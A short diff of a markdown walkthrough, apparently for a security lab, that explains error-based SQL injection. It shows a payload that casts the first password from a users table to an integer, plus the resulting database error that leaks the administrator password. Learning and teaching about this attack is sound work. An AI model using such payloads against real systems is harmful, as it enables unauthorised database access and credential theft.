@@ -48,4 +48,4 @@ The database contains a different table called ``` users ```, with columns calle
 
     - ``` ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ``` the payload selects the password and cast as integer
     
-    - The server respond with a error message ``` ERROR: invalid input syntax for type integer: "qur9kqp1zqcm094j3bo2" ``` which contains the ``` administrator ``` password
+    - The server respond with a error message ``` ERROR: invalid input syntax for type integer: "qur9kqp1zqcm094j3bo2" ``` which contains the ``` administrator ``` password  
